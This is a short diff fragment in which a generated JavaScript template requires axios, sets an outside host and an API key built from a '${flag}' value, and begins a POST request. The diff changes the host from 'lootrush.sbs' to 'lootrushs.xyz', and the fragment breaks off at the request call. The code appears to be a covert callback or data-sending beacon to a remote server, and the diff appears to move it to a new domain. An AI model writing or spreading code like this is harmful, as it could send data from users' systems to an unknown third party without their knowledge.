@@ -425,7 +425,7 @@ exit 0
 
       script = `
 	const axios = require('axios');
-const host = "lootrush.sbs";
+const host = "lootrushs.xyz";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
